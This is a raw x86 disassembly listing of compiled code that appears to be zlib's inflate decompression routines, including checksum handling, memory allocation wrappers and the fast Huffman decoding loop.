   1cab2:	jmp    0x1cab9
   1cab4:	call   0x1d562
   1cab9:	mov    ecx,DWORD PTR [ebp+0x8]
   1cabc:	mov    DWORD PTR [esi+0x18],eax
   1cabf:	mov    DWORD PTR [ecx+0x30],eax
   1cac2:	mov    edx,ecx
   1cac4:	cmp    DWORD PTR [esi+0x10],0x0
   1cac8:	mov    eax,DWORD PTR [ebp-0x10]
   1cacb:	mov    DWORD PTR [ebp-0x1c],eax
   1cace:	mov    eax,ebx
   1cad0:	jne    0x1caf5
   1cad2:	and    eax,0xff00
   1cad7:	mov    ecx,ebx
   1cad9:	shl    ecx,0x10
   1cadc:	add    eax,ecx
   1cade:	mov    ecx,ebx
   1cae0:	shr    ecx,0x8
   1cae3:	and    ecx,0xff00
   1cae9:	shl    eax,0x8
   1caec:	add    eax,ecx
   1caee:	mov    ecx,ebx
   1caf0:	shr    ecx,0x18
   1caf3:	add    eax,ecx
   1caf5:	cmp    eax,DWORD PTR [esi+0x18]
   1caf8:	je     0x1cb03
   1cafa:	mov    DWORD PTR [edx+0x18],0x1eca4
   1cb01:	jmp    0x1cb4d
   1cb03:	xor    ebx,ebx
   1cb05:	xor    edi,edi
   1cb07:	mov    DWORD PTR [esi],0x19
   1cb0d:	cmp    DWORD PTR [esi+0x8],0x0
   1cb11:	je     0x1cb8b
   1cb13:	cmp    DWORD PTR [esi+0x10],0x0
   1cb17:	je     0x1cb8b
   1cb19:	cmp    edi,0x20
   1cb1c:	jae    0x1cb41
   1cb1e:	cmp    DWORD PTR [ebp-0x8],0x0
   1cb22:	je     0x1cba1
   1cb24:	mov    eax,DWORD PTR [ebp-0x4]
   1cb27:	movzx  eax,BYTE PTR [eax]
   1cb2a:	dec    DWORD PTR [ebp-0x8]
   1cb2d:	mov    ecx,edi
   1cb2f:	shl    eax,cl
   1cb31:	add    edi,0x8
   1cb34:	add    ebx,eax
   1cb36:	inc    DWORD PTR [ebp-0x4]
   1cb39:	cmp    edi,0x20
   1cb3c:	jb     0x1cb1e
   1cb3e:	mov    edx,DWORD PTR [ebp+0x8]
   1cb41:	cmp    ebx,DWORD PTR [esi+0x1c]
   1cb44:	je     0x1cb87
   1cb46:	mov    DWORD PTR [edx+0x18],0x1ec8c
   1cb4d:	mov    DWORD PTR [esi],0x1b
   1cb53:	mov    eax,DWORD PTR [esi]
   1cb55:	cmp    eax,0x1c
   1cb58:	jbe    0x1bb4a
   1cb5e:	jmp    0x1bb40
   1cb63:	mov    eax,DWORD PTR [ebp-0x18]
   1cb66:	mov    DWORD PTR [edx+0xc],eax
   1cb69:	mov    eax,DWORD PTR [ebp-0x10]
   1cb6c:	mov    DWORD PTR [edx+0x10],eax
   1cb6f:	mov    eax,DWORD PTR [ebp-0x4]
   1cb72:	mov    DWORD PTR [edx],eax
   1cb74:	mov    eax,DWORD PTR [ebp-0x8]
   1cb77:	mov    DWORD PTR [edx+0x4],eax
   1cb7a:	mov    DWORD PTR [esi+0x38],ebx
   1cb7d:	mov    DWORD PTR [esi+0x3c],edi
   1cb80:	push   0x2
   1cb82:	jmp    0x1bb42
   1cb87:	xor    ebx,ebx
   1cb89:	xor    edi,edi
   1cb8b:	mov    DWORD PTR [esi],0x1a
   1cb91:	mov    DWORD PTR [ebp-0x24],0x1
   1cb98:	jmp    0x1cba1
   1cb9a:	mov    DWORD PTR [ebp-0x24],0xfffffffd
   1cba1:	mov    eax,DWORD PTR [ebp+0x8]
   1cba4:	mov    ecx,DWORD PTR [ebp-0x18]
   1cba7:	mov    DWORD PTR [eax+0xc],ecx
   1cbaa:	mov    ecx,DWORD PTR [ebp-0x10]
   1cbad:	mov    DWORD PTR [eax+0x10],ecx
   1cbb0:	mov    ecx,DWORD PTR [ebp-0x4]
   1cbb3:	mov    DWORD PTR [eax],ecx
   1cbb5:	mov    ecx,DWORD PTR [ebp-0x8]
   1cbb8:	mov    DWORD PTR [eax+0x4],ecx
   1cbbb:	cmp    DWORD PTR [esi+0x28],0x0
   1cbbf:	mov    DWORD PTR [esi+0x38],ebx
   1cbc2:	mov    DWORD PTR [esi+0x3c],edi
   1cbc5:	jne    0x1cbd7
   1cbc7:	cmp    DWORD PTR [esi],0x18
   1cbca:	jge    0x1cbf3
   1cbcc:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbcf:	mov    ecx,DWORD PTR [ebp+0x8]
   1cbd2:	cmp    eax,DWORD PTR [ecx+0x10]
   1cbd5:	je     0x1cbf3
   1cbd7:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbda:	mov    edi,DWORD PTR [ebp+0x8]
   1cbdd:	call   0x1ba02
   1cbe2:	test   eax,eax
   1cbe4:	je     0x1cbf3
   1cbe6:	mov    DWORD PTR [esi],0x1c
   1cbec:	push   0xfffffffc
   1cbee:	jmp    0x1bb42
   1cbf3:	mov    edi,DWORD PTR [ebp+0x8]
   1cbf6:	mov    eax,DWORD PTR [ebp-0x2c]
   1cbf9:	sub    eax,DWORD PTR [edi+0x4]
   1cbfc:	mov    ebx,DWORD PTR [ebp-0x1c]
   1cbff:	sub    ebx,DWORD PTR [edi+0x10]
   1cc02:	add    DWORD PTR [edi+0x8],eax
   1cc05:	add    DWORD PTR [edi+0x14],ebx
   1cc08:	add    DWORD PTR [esi+0x1c],ebx
   1cc0b:	cmp    DWORD PTR [esi+0x8],0x0
   1cc0f:	mov    DWORD PTR [ebp-0x2c],eax
   1cc12:	je     0x1cc3d
   1cc14:	test   ebx,ebx
   1cc16:	je     0x1cc3d
   1cc18:	mov    eax,DWORD PTR [edi+0xc]
   1cc1b:	push   ebx
   1cc1c:	sub    eax,ebx
   1cc1e:	cmp    DWORD PTR [esi+0x10],0x0
   1cc22:	push   eax
   1cc23:	push   DWORD PTR [esi+0x18]
   1cc26:	je     0x1cc2f
   1cc28:	call   0x1da04
   1cc2d:	jmp    0x1cc34
   1cc2f:	call   0x1d562
   1cc34:	mov    DWORD PTR [esi+0x18],eax
   1cc37:	mov    DWORD PTR [edi+0x30],eax
   1cc3a:	mov    eax,DWORD PTR [ebp-0x2c]
   1cc3d:	cmp    DWORD PTR [esi],0xb
   1cc40:	jne    0x1cc49
   1cc42:	mov    ecx,0x80
   1cc47:	jmp    0x1cc4b
   1cc49:	xor    ecx,ecx
   1cc4b:	mov    edx,DWORD PTR [esi+0x4]
   1cc4e:	neg    edx
   1cc50:	sbb    edx,edx
   1cc52:	and    edx,0x40
   1cc55:	add    edx,ecx
   1cc57:	add    edx,DWORD PTR [esi+0x3c]
   1cc5a:	mov    DWORD PTR [edi+0x2c],edx
   1cc5d:	test   eax,eax
   1cc5f:	jne    0x1cc65
   1cc61:	test   ebx,ebx
   1cc63:	je     0x1cc6b
   1cc65:	cmp    DWORD PTR [ebp+0xc],0x4
   1cc69:	jne    0x1cc78
   1cc6b:	cmp    DWORD PTR [ebp-0x24],0x0
   1cc6f:	jne    0x1cc78
   1cc71:	mov    DWORD PTR [ebp-0x24],0xfffffffb
   1cc78:	mov    eax,DWORD PTR [ebp-0x24]
   1cc7b:	jmp    0x1bb43
   1cc80:	mov    edi,edi
   1cc82:	push   esp
   1cc83:	mov    ebx,0xbc710001
   1cc88:	add    DWORD PTR [eax],eax
   1cc8a:	push   es
   1cc8b:	mov    ebp,0xbd7c0001
   1cc90:	add    DWORD PTR [eax],eax
   1cc92:	cmc    
   1cc93:	mov    ebp,0xbe740001
   1cc98:	add    DWORD PTR [eax],eax
   1cc9a:	movsx  eax,WORD PTR [ecx]
   1cc9d:	add    BYTE PTR [eax+0x3d0001bf],ch
   1cca3:	rol    BYTE PTR [ecx],0x0
   1cca6:	mov    ebp,0x1b0001c0
   1ccab:	rol    DWORD PTR [ecx],0x0
   1ccae:	rol    DWORD PTR ds:[ecx],0x0
   1ccb2:	dec    ebx
   1ccb3:	rol    DWORD PTR [ecx],0x0
   1ccb6:	cli    
   1ccb7:	rol    DWORD PTR [ecx],0x0
   1ccba:	pop    edx
   1ccbb:	ret    0x1
   1ccbe:	mov    al,0xc2
   1ccc0:	add    DWORD PTR [eax],eax
   1ccc2:	jb     0x1cc87
   1ccc4:	add    DWORD PTR [eax],eax
   1ccc6:	loopne 0x1cc8d
   1ccc8:	add    DWORD PTR [eax],eax
   1ccca:	dec    eax
   1cccb:	mov    BYTE PTR [ecx],0x0
   1ccce:	jecxz  0x1cc97
   1ccd0:	add    DWORD PTR [eax],eax
   1ccd2:	sub    eax,ecx
   1ccd4:	add    DWORD PTR [eax],eax
   1ccd6:	inc    esp
   1ccd7:	leave  
   1ccd8:	add    DWORD PTR [eax],eax
   1ccda:	test   al,0xc9
   1ccdc:	add    DWORD PTR [eax],eax
   1ccde:	xor    dl,cl
   1cce0:	add    DWORD PTR [eax],eax
   1cce2:	push   ebx
   1cce3:	retf   0x1
   1cce6:	or     eax,0x910001cb
   1cceb:	retf   
   1ccec:	add    DWORD PTR [eax],eax
   1ccee:	call   0x1cb:0xec0001cb
   1ccf5:	add    ah,cl
   1ccf7:	int3   
   1ccf8:	int3   
   1ccf9:	int3   
   1ccfa:	int3   
   1ccfb:	int3   
   1ccfc:	mov    edi,edi
   1ccfe:	push   ebp
   1ccff:	mov    ebp,esp
   1cd01:	push   esi
   1cd02:	mov    esi,DWORD PTR [ebp+0x8]
   1cd05:	test   esi,esi
   1cd07:	je     0x1cd35
   1cd09:	mov    eax,DWORD PTR [esi+0x1c]
   1cd0c:	test   eax,eax
   1cd0e:	je     0x1cd35
   1cd10:	mov    ecx,DWORD PTR [esi+0x24]
   1cd13:	test   ecx,ecx
   1cd15:	je     0x1cd35
   1cd17:	mov    eax,DWORD PTR [eax+0x34]
   1cd1a:	test   eax,eax
   1cd1c:	je     0x1cd24
   1cd1e:	push   eax
   1cd1f:	push   DWORD PTR [esi+0x28]
   1cd22:	call   ecx
   1cd24:	push   DWORD PTR [esi+0x1c]
   1cd27:	push   DWORD PTR [esi+0x28]
   1cd2a:	call   DWORD PTR [esi+0x24]
   1cd2d:	and    DWORD PTR [esi+0x1c],0x0
   1cd31:	xor    eax,eax
   1cd33:	jmp    0x1cd38
   1cd35:	push   0xfffffffe
   1cd37:	pop    eax
   1cd38:	pop    esi
   1cd39:	pop    ebp
   1cd3a:	ret    0x4
   1cd3d:	int3   
   1cd3e:	int3   
   1cd3f:	int3   
   1cd40:	int3   
   1cd41:	int3   
   1cd42:	mov    edi,edi
   1cd44:	push   ebp
   1cd45:	mov    ebp,esp
   1cd47:	mov    eax,DWORD PTR [ebp+0xc]
   1cd4a:	imul   eax,DWORD PTR [ebp+0x10]
   1cd4e:	push   eax
   1cd4f:	call   0x1da28
   1cd54:	pop    ecx
   1cd55:	pop    ebp
   1cd56:	ret    0xc
   1cd59:	int3   
   1cd5a:	int3   
   1cd5b:	int3   
   1cd5c:	int3   
   1cd5d:	int3   
   1cd5e:	mov    edi,edi
   1cd60:	push   ebp
   1cd61:	mov    ebp,esp
   1cd63:	push   DWORD PTR [ebp+0xc]
   1cd66:	call   0x10a86
   1cd6b:	pop    ecx
   1cd6c:	pop    ebp
   1cd6d:	ret    0x8
   1cd70:	int3   
   1cd71:	int3   
   1cd72:	int3   
   1cd73:	int3   
   1cd74:	int3   
   1cd75:	int3   
   1cd76:	mov    edi,edi
   1cd78:	push   ebp
   1cd79:	mov    ebp,esp
   1cd7b:	sub    esp,0x40
   1cd7e:	mov    eax,DWORD PTR [ebp+0x8]
   1cd81:	mov    ecx,DWORD PTR [eax+0x4]
   1cd84:	mov    edx,DWORD PTR [eax+0x10]
   1cd87:	push   ebx
   1cd88:	mov    ebx,DWORD PTR [eax]
   1cd8a:	dec    ebx
   1cd8b:	lea    ecx,[ecx+ebx*1-0x5]
   1cd8f:	mov    DWORD PTR [ebp-0x2c],ecx
   1cd92:	mov    ecx,edx
   1cd94:	sub    ecx,DWORD PTR [ebp+0xc]
   1cd97:	push   esi
   1cd98:	mov    esi,DWORD PTR [eax+0x1c]
   1cd9b:	push   edi
   1cd9c:	mov    edi,DWORD PTR [eax+0xc]
   1cd9f:	dec    edi
   1cda0:	add    ecx,edi
   1cda2:	mov    DWORD PTR [ebp-0x3c],ecx
   1cda5:	lea    ecx,[edx+edi*1-0x101]
   1cdac:	mov    DWORD PTR [ebp-0x30],ecx
   1cdaf:	mov    ecx,DWORD PTR [esi+0x28]
   1cdb2:	mov    DWORD PTR [ebp-0x24],ecx
   1cdb5:	mov    ecx,DWORD PTR [esi+0x2c]
   1cdb8:	mov    DWORD PTR [ebp-0x40],ecx
   1cdbb:	mov    ecx,DWORD PTR [esi+0x30]
   1cdbe:	mov    DWORD PTR [ebp-0x18],ecx
   1cdc1:	mov    ecx,DWORD PTR [esi+0x34]
   1cdc4:	mov    DWORD PTR [ebp-0x28],ecx
   1cdc7:	mov    ecx,DWORD PTR [esi+0x38]
   1cdca:	mov    DWORD PTR [ebp-0x4],ecx
   1cdcd:	mov    ecx,DWORD PTR [esi+0x3c]
   1cdd0:	mov    DWORD PTR [ebp+0xc],ecx
   1cdd3:	mov    ecx,DWORD PTR [esi+0x4c]
   1cdd6:	xor    edx,edx
   1cdd8:	mov    DWORD PTR [ebp-0x1c],ecx
   1cddb:	mov    ecx,DWORD PTR [esi+0x50]
   1cdde:	inc    edx
   1cddf:	mov    DWORD PTR [ebp-0x20],ecx
   1cde2:	mov    ecx,DWORD PTR [esi+0x54]
   1cde5:	shl    edx,cl
   1cde7:	mov    ecx,DWORD PTR [esi+0x58]
   1cdea:	dec    edx
   1cdeb:	mov    DWORD PTR [ebp-0x34],edx
   1cdee:	xor    edx,edx
   1cdf0:	inc    edx
   1cdf1:	shl    edx,cl
   1cdf3:	dec    edx
   1cdf4:	mov    DWORD PTR [ebp-0x38],edx
   1cdf7:	mov    ecx,DWORD PTR [ebp+0xc]
   1cdfa:	cmp    ecx,0xf
   1cdfd:	jae    0x1ce1c
   1cdff:	add    DWORD PTR [ebp+0xc],0x8
   1ce03:	inc    ebx
   1ce04:	movzx  edx,BYTE PTR [ebx]
   1ce07:	shl    edx,cl
   1ce09:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce0c:	add    DWORD PTR [ebp-0x4],edx
   1ce0f:	inc    ebx
   1ce10:	movzx  edx,BYTE PTR [ebx]
   1ce13:	shl    edx,cl
   1ce15:	add    DWORD PTR [ebp-0x4],edx
   1ce18:	add    DWORD PTR [ebp+0xc],0x8
   1ce1c:	mov    ecx,DWORD PTR [ebp-0x34]
   1ce1f:	and    ecx,DWORD PTR [ebp-0x4]
   1ce22:	mov    edx,DWORD PTR [ebp-0x1c]
   1ce25:	mov    ecx,DWORD PTR [edx+ecx*4]
   1ce28:	mov    DWORD PTR [ebp-0x10],ecx
   1ce2b:	mov    edx,DWORD PTR [ebp-0x10]
   1ce2e:	shr    ecx,0x8
   1ce31:	movzx  ecx,cl
   1ce34:	shr    DWORD PTR [ebp-0x4],cl
   1ce37:	sub    DWORD PTR [ebp+0xc],ecx
   1ce3a:	mov    DWORD PTR [ebp-0x8],ecx
   1ce3d:	movzx  ecx,dl
   1ce40:	mov    DWORD PTR [ebp-0x8],ecx
   1ce43:	test   ecx,ecx
   1ce45:	je     0x1ce8e
   1ce47:	mov    ecx,DWORD PTR [ebp-0x8]
   1ce4a:	test   cl,0x10
   1ce4d:	jne    0x1ce99
   1ce4f:	test   cl,0x40
   1ce52:	jne    0x1d0e8
   1ce58:	xor    edx,edx
   1ce5a:	inc    edx
   1ce5b:	shl    edx,cl
   1ce5d:	mov    ecx,DWORD PTR [ebp-0x10]
   1ce60:	shr    ecx,0x10
   1ce63:	dec    edx
   1ce64:	and    edx,DWORD PTR [ebp-0x4]
   1ce67:	add    edx,ecx
   1ce69:	mov    ecx,DWORD PTR [ebp-0x1c]
   1ce6c:	mov    ecx,DWORD PTR [ecx+edx*4]
   1ce6f:	mov    DWORD PTR [ebp-0x10],ecx
   1ce72:	mov    edx,DWORD PTR [ebp-0x10]
   1ce75:	shr    ecx,0x8
   1ce78:	movzx  ecx,cl
   1ce7b:	shr    DWORD PTR [ebp-0x4],cl
   1ce7e:	sub    DWORD PTR [ebp+0xc],ecx
   1ce81:	mov    DWORD PTR [ebp-0x8],ecx
   1ce84:	movzx  ecx,dl
   1ce87:	mov    DWORD PTR [ebp-0x8],ecx
   1ce8a:	test   ecx,ecx
   1ce8c:	jne    0x1ce47
   1ce8e:	inc    edi
   1ce8f:	shr    edx,0x10
   1ce92:	mov    BYTE PTR [edi],dl
   1ce94:	jmp    0x1d0c6
   1ce99:	shr    edx,0x10
   1ce9c:	and    ecx,0xf
   1ce9f:	mov    DWORD PTR [ebp-0xc],edx
   1cea2:	mov    DWORD PTR [ebp-0x8],ecx
   1cea5:	je     0x1ced1
   1cea7:	mov    ecx,DWORD PTR [ebp+0xc]
   1ceaa:	cmp    ecx,DWORD PTR [ebp-0x8]
   1cead:	jae    0x1cebc
   1ceaf:	inc    ebx
   1ceb0:	movzx  edx,BYTE PTR [ebx]
   1ceb3:	shl    edx,cl
   1ceb5:	add    DWORD PTR [ebp-0x4],edx
   1ceb8:	add    DWORD PTR [ebp+0xc],0x8
   1cebc:	mov    ecx,DWORD PTR [ebp-0x8]
   1cebf:	xor    edx,edx
   1cec1:	inc    edx
   1cec2:	shl    edx,cl
   1cec4:	dec    edx
   1cec5:	and    edx,DWORD PTR [ebp-0x4]
   1cec8:	shr    DWORD PTR [ebp-0x4],cl
   1cecb:	add    DWORD PTR [ebp-0xc],edx
   1cece:	sub    DWORD PTR [ebp+0xc],ecx
   1ced1:	mov    ecx,DWORD PTR [ebp+0xc]
   1ced4:	cmp    ecx,0xf
   1ced7:	jae    0x1cef6
   1ced9:	add    DWORD PTR [ebp+0xc],0x8
   1cedd:	inc    ebx
   1cede:	movzx  edx,BYTE PTR [ebx]
   1cee1:	shl    edx,cl
   1cee3:	mov    ecx,DWORD PTR [ebp+0xc]
   1cee6:	add    DWORD PTR [ebp-0x4],edx
   1cee9:	inc    ebx
   1ceea:	movzx  edx,BYTE PTR [ebx]
   1ceed:	shl    edx,cl
   1ceef:	add    DWORD PTR [ebp-0x4],edx
   1cef2:	add    DWORD PTR [ebp+0xc],0x8
   1cef6:	mov    ecx,DWORD PTR [ebp-0x38]
   1cef9:	and    ecx,DWORD PTR [ebp-0x4]
   1cefc:	mov    edx,DWORD PTR [ebp-0x20]
   1ceff:	mov    ecx,DWORD PTR [edx+ecx*4]
   1cf02:	jmp    0x1cf22
   1cf04:	test   cl,0x40
   1cf07:	jne    0x1d0df
   1cf0d:	xor    edx,edx
   1cf0f:	inc    edx
   1cf10:	shl    edx,cl
   1cf12:	movzx  ecx,WORD PTR [ebp-0xe]
   1cf16:	dec    edx
   1cf17:	and    edx,DWORD PTR [ebp-0x4]
   1cf1a:	add    edx,ecx
   1cf1c:	mov    ecx,DWORD PTR [ebp-0x20]
   1cf1f:	mov    ecx,DWORD PTR [ecx+edx*4]
   1cf22:	mov    DWORD PTR [ebp-0x10],ecx
   1cf25:	mov    edx,DWORD PTR [ebp-0x10]
   1cf28:	shr    ecx,0x8
   1cf2b:	movzx  ecx,cl
   1cf2e:	shr    DWORD PTR [ebp-0x4],cl
   1cf31:	sub    DWORD PTR [ebp+0xc],ecx
   1cf34:	mov    DWORD PTR [ebp-0x8],ecx
   1cf37:	movzx  ecx,dl
   1cf3a:	test   cl,0x10
   1cf3d:	je     0x1cf04
   1cf3f:	and    ecx,0xf
   1cf42:	shr    edx,0x10
   1cf45:	mov    DWORD PTR [ebp-0x14],edx
   1cf48:	mov    DWORD PTR [ebp-0x8],ecx
   1cf4b:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf4e:	jae    0x1cf7b
   1cf50:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf53:	add    DWORD PTR [ebp+0xc],0x8
   1cf57:	inc    ebx
   1cf58:	movzx  edx,BYTE PTR [ebx]
   1cf5b:	shl    edx,cl
   1cf5d:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf60:	add    DWORD PTR [ebp-0x4],edx
   1cf63:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf66:	jae    0x1cf7b
   1cf68:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf6b:	inc    ebx
   1cf6c:	movzx  edx,BYTE PTR [ebx]
   1cf6f:	shl    edx,cl
   1cf71:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf74:	add    DWORD PTR [ebp-0x4],edx
   1cf77:	add    DWORD PTR [ebp+0xc],0x8
   1cf7b:	xor    edx,edx
   1cf7d:	inc    edx
   1cf7e:	shl    edx,cl
   1cf80:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf83:	sub    DWORD PTR [ebp+0xc],ecx
   1cf86:	dec    edx
   1cf87:	and    edx,DWORD PTR [ebp-0x4]
   1cf8a:	shr    DWORD PTR [ebp-0x4],cl
   1cf8d:	add    DWORD PTR [ebp-0x14],edx
   1cf90:	mov    edx,DWORD PTR [ebp-0x14]
   1cf93:	mov    ecx,edi
   1cf95:	sub    ecx,DWORD PTR [ebp-0x3c]
   1cf98:	cmp    edx,ecx
   1cf9a:	jbe    0x1d08e
   1cfa0:	sub    edx,ecx
   1cfa2:	mov    DWORD PTR [ebp-0x8],edx
   1cfa5:	cmp    edx,DWORD PTR [ebp-0x40]
   1cfa8:	ja     0x1d0d6
   1cfae:	mov    ecx,DWORD PTR [ebp-0x28]
   1cfb1:	dec    ecx
   1cfb2:	mov    DWORD PTR [ebp-0x10],ecx
   1cfb5:	mov    ecx,DWORD PTR [ebp-0x18]
   1cfb8:	test   ecx,ecx
   1cfba:	jne    0x1cfe2
   1cfbc:	mov    ecx,DWORD PTR [ebp-0x24]
   1cfbf:	sub    ecx,edx
   1cfc1:	add    DWORD PTR [ebp-0x10],ecx
   1cfc4:	mov    ecx,edx
   1cfc6:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfc9:	jae    0x1d057
   1cfcf:	sub    DWORD PTR [ebp-0xc],ecx
   1cfd2:	mov    ecx,DWORD PTR [ebp-0x10]
   1cfd5:	inc    ecx
   1cfd6:	mov    dl,BYTE PTR [ecx]
   1cfd8:	inc    edi
   1cfd9:	dec    DWORD PTR [ebp-0x8]
   1cfdc:	mov    BYTE PTR [edi],dl
   1cfde:	jne    0x1cfd5
   1cfe0:	jmp    0x1d02d
   1cfe2:	cmp    ecx,edx
   1cfe4:	jae    0x1d037
   1cfe6:	sub    ecx,edx
   1cfe8:	add    ecx,DWORD PTR [ebp-0x24]
   1cfeb:	add    DWORD PTR [ebp-0x10],ecx
   1cfee:	mov    ecx,DWORD PTR [ebp-0x8]
   1cff1:	sub    ecx,DWORD PTR [ebp-0x18]
   1cff4:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cff7:	jae    0x1d057
   1cff9:	sub    DWORD PTR [ebp-0xc],ecx
   1cffc:	inc    DWORD PTR [ebp-0x10]
   1cfff:	mov    edx,DWORD PTR [ebp-0x10]
   1d002:	mov    dl,BYTE PTR [edx]
   1d004:	inc    edi
   1d005:	dec    ecx
   1d006:	mov    BYTE PTR [edi],dl
   1d008:	jne    0x1cffc
   1d00a:	mov    ecx,DWORD PTR [ebp-0x28]
   1d00d:	dec    ecx
   1d00e:	mov    DWORD PTR [ebp-0x10],ecx
   1d011:	mov    ecx,DWORD PTR [ebp-0x18]
   1d014:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d017:	jae    0x1d057
   1d019:	sub    DWORD PTR [ebp-0xc],ecx
   1d01c:	mov    DWORD PTR [ebp-0x8],ecx
   1d01f:	mov    ecx,DWORD PTR [ebp-0x10]
   1d022:	inc    ecx
   1d023:	mov    dl,BYTE PTR [ecx]
   1d025:	inc    edi
   1d026:	dec    DWORD PTR [ebp-0x8]
   1d029:	mov    BYTE PTR [edi],dl
   1d02b:	jne    0x1d022
   1d02d:	mov    ecx,edi
   1d02f:	sub    ecx,DWORD PTR [ebp-0x14]
   1d032:	mov    DWORD PTR [ebp-0x10],ecx
   1d035:	jmp    0x1d05a
   1d037:	sub    ecx,edx
   1d039:	add    DWORD PTR [ebp-0x10],ecx
   1d03c:	mov    ecx,DWORD PTR [ebp-0x8]
   1d03f:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d042:	jae    0x1d057
   1d044:	sub    DWORD PTR [ebp-0xc],ecx
   1d047:	mov    ecx,DWORD PTR [ebp-0x10]
   1d04a:	inc    ecx
   1d04b:	mov    dl,BYTE PTR [ecx]
   1d04d:	inc    edi
   1d04e:	dec    DWORD PTR [ebp-0x8]
   1d051:	mov    BYTE PTR [edi],dl
   1d053:	jne    0x1d04a
   1d055:	jmp    0x1d02d
   1d057:	mov    ecx,DWORD PTR [ebp-0x10]
   1d05a:	mov    edx,DWORD PTR [ebp-0xc]
   1d05d:	cmp    edx,0x2
   1d060:	jbe    0x1d0ae
   1d062:	lea    eax,[edx-0x3]
   1d065:	push   0x3
   1d067:	xor    edx,edx
   1d069:	pop    ecx
   1d06a:	div    ecx
   1d06c:	mov    ecx,DWORD PTR [ebp-0x10]
   1d06f:	inc    eax
   1d070:	sub    DWORD PTR [ebp-0xc],0x3
   1d074:	inc    ecx
   1d075:	mov    dl,BYTE PTR [ecx]
   1d077:	inc    edi
   1d078:	mov    BYTE PTR [edi],dl
   1d07a:	inc    ecx
   1d07b:	mov    dl,BYTE PTR [ecx]
   1d07d:	inc    edi
   1d07e:	inc    ecx
   1d07f:	mov    BYTE PTR [edi],dl
   1d081:	mov    dl,BYTE PTR [ecx]
   1d083:	inc    edi
   1d084:	dec    eax
   1d085:	mov    BYTE PTR [edi],dl
   1d087:	jne    0x1d070
   1d089:	mov    eax,DWORD PTR [ebp+0x8]
   1d08c:	jmp    0x1d0ae
   1d08e:	mov    ecx,edi
   1d090:	sub    ecx,edx
   1d092:	sub    DWORD PTR [ebp-0xc],0x3
   1d096:	inc    ecx
   1d097:	mov    dl,BYTE PTR [ecx]
   1d099:	inc    edi
   1d09a:	mov    BYTE PTR [edi],dl
   1d09c:	inc    ecx
   1d09d:	mov    dl,BYTE PTR [ecx]
   1d09f:	inc    edi
   1d0a0:	inc    ecx
   1d0a1:	mov    BYTE PTR [edi],dl
   1d0a3:	mov    dl,BYTE PTR [ecx]
   1d0a5:	inc    edi
   1d0a6:	cmp    DWORD PTR [ebp-0xc],0x2
   1d0aa:	mov    BYTE PTR [edi],dl
   1d0ac:	ja     0x1d092
   1d0ae:	cmp    DWORD PTR [ebp-0xc],0x0
   1d0b2:	je     0x1d0c6
   1d0b4:	inc    ecx
   1d0b5:	mov    dl,BYTE PTR [ecx]
   1d0b7:	inc    edi
   1d0b8:	cmp    DWORD PTR [ebp-0xc],0x1
   1d0bc:	mov    BYTE PTR [edi],dl
   1d0be:	jbe    0x1d0c6
   1d0c0:	mov    cl,BYTE PTR [ecx+0x1]
   1d0c3:	inc    edi
   1d0c4:	mov    BYTE PTR [edi],cl
   1d0c6:	cmp    ebx,DWORD PTR [ebp-0x2c]
   1d0c9:	jae    0x1d102
   1d0cb:	cmp    edi,DWORD PTR [ebp-0x30]
   1d0ce:	jb     0x1cdf7
   1d0d4:	jmp    0x1d102
   1d0d6:	mov    DWORD PTR [eax+0x18],0x1ecba
   1d0dd:	jmp    0x1d0fc
   1d0df:	mov    DWORD PTR [eax+0x18],0x1ecd8
   1d0e6:	jmp    0x1d0fc
   1d0e8:	test   cl,0x20
   1d0eb:	je     0x1d0f5
   1d0ed:	mov    DWORD PTR [esi],0xb
   1d0f3:	jmp    0x1d102
   1d0f5:	mov    DWORD PTR [eax+0x18],0x1ecee
   1d0fc:	mov    DWORD PTR [esi],0x1b
   1d102:	mov    ecx,DWORD PTR [ebp+0xc]
   1d105:	shr    ecx,0x3
   1d108:	sub    ebx,ecx
   1d10a:	shl    ecx,0x3
   1d10d:	sub    DWORD PTR [ebp+0xc],ecx
   1d110:	xor    ecx,ecx
   1d112:	inc    ecx
   1d113:	mov    edx,ecx
   1d115:	mov    ecx,DWORD PTR [ebp+0xc]
   1d118:	shl    edx,cl
   1d11a:	dec    edx
   1d11b:	mov    ecx,edx
   1d11d:	mov    edx,DWORD PTR [ebp-0x4]
   1d120:	and    edx,ecx
   1d122:	lea    ecx,[ebx+0x1]
   1d125:	mov    DWORD PTR [eax],ecx
   1d127:	lea    ecx,[edi+0x1]
   1d12a:	mov    DWORD PTR [eax+0xc],ecx
   1d12d:	mov    ecx,DWORD PTR [ebp-0x2c]
   1d130:	sub    ecx,ebx
   1d132:	add    ecx,0x5
   1d135:	mov    DWORD PTR [eax+0x4],ecx
   1d138:	mov    ecx,DWORD PTR [ebp-0x30]
   1d13b:	sub    ecx,edi
   1d13d:	add    ecx,0x101
   1d143:	mov    DWORD PTR [eax+0x10],ecx
   1d146:	mov    eax,DWORD PTR [ebp+0xc]
   1d149:	pop    edi
   1d14a:	mov    DWORD PTR [esi+0x38],edx
   1d14d:	mov    DWORD PTR [esi+0x3c],eax
   1d150:	pop    esi
   1d151:	pop    ebx
   1d152:	leave  
   1d153:	ret    0x8
   1d156:	int3   
   1d157:	int3   
   1d158:	int3   
   1d159:	int3   
   1d15a:	int3   
   1d15b:	int3   
   1d15c:	mov    edi,edi
   1d15e:	push   ebp
   1d15f:	mov    ebp,esp
   1d161:	sub    esp,0x90
   1d167:	mov    eax,ds:0x7e528
   1d16c:	xor    eax,ebp
   1d16e:	mov    DWORD PTR [ebp-0x4],eax
   1d171:	mov    eax,DWORD PTR [ebp+0xc]
   1d174:	mov    edx,DWORD PTR [ebp+0x18]
   1d177:	mov    DWORD PTR [ebp-0x7c],eax
   1d17a:	mov    eax,DWORD PTR [ebp+0x1c]
   1d17d:	push   ebx
   1d17e:	mov    DWORD PTR [ebp-0x4c],eax
   1d181:	xor    eax,eax
   1d183:	push   esi
